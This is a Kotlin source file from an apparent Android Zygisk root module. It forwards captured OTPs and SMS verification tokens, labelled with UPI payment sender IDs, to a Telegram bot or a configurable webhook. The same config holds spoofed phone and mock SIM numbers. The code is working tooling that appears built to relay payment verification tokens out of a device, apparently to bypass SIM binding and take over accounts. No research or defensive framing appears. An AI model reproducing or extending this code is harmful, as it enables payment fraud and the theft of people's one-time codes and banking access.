package com.hivirtus.zygiskmode

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(private val configManager: ConfigManager) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.autoForwardToken) return false

        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        val phone = formatPhone(otp.phone.ifBlank { configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 } })

        if (botToken.isBlank() || chatId.isBlank()) {
            if (config.forwardUrl.isBlank()) return false
            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp, phone)
        }

        return forwardTelegram(botToken, chatId, otp, phone)
    }

    fun sendTestMessage(): Boolean {
        val config = configManager.load()
        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        if (botToken.isBlank() || chatId.isBlank()) return false

        val phone = formatPhone(configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 })
        val testOtp = LastOtp(
            otp = "TEST1234",
            sender = "AD-YESPRO-S",
            body = "ppuEHZ0DauJc0g4xm-G7M)4CxwMb&uZJx?jJp $phone",
            phone = phone,
            messageLabel = "YESPRODUPI"
        )
        return forwardTelegram(botToken, chatId, testOtp, phone)
    }

    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp, phone: String): Boolean {
        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp, phone))
    }

    /** Same format as user screenshot — Zygisk Menu token card */
    fun buildZygiskMenuMessage(otp: LastOtp, phone: String): String {
        val toPhone = formatPhone(phone)
        val messageLabel = otp.messageLabel.ifBlank { formatSenderLabel(otp.sender) }
        val tokenBody = otp.body.ifBlank { otp.otp }

        return buildString {
            appendLine("📱 <b>Zygisk Menu</b>")
            appendLine("<b>Mode By @hivirtus @liqdy</b>")
            appendLine("────────────────")
            appendLine("📞 <b>To:</b> $toPhone")
            appendLine("💬 <b>Message:</b> $messageLabel")
            append(tokenBody)
        }
    }

    private fun formatSenderLabel(sender: String): String {
        var label = sender
        listOf("AD-", "VM-", "JD-", "BP-", "TX-").forEach { prefix ->
            if (label.startsWith(prefix, ignoreCase = true)) {
                label = label.substring(prefix.length)
            }
        }
        label = label.trim { it == '-' || it == ' ' }
        if (label.endsWith("-S", ignoreCase = true)) {
            label = label.dropLast(2)
        }
        return label.uppercase().ifBlank { "UPIVERIFY" }
    }

    private fun formatPhone(phone: String): String {
        val cleaned = phone.trim()
        return if (cleaned.startsWith("+")) cleaned else "+$cleaned"
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun forwardWebhook(url: String, method: String, otp: LastOtp, phone: String): Boolean {
        val payload = JSONObject()
            .put("otp", otp.otp)
            .put("token", otp.body.ifBlank { otp.otp })
            .put("sender", otp.sender)
            .put("phone", phone)
            .put("message_label", otp.messageLabel)
            .put("direction", otp.direction)
            .put("telegram_format", buildZygiskMenuMessage(otp, phone))
            .toString()

        val request = Request.Builder()
            .url(url)
            .method(method.uppercase(), payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
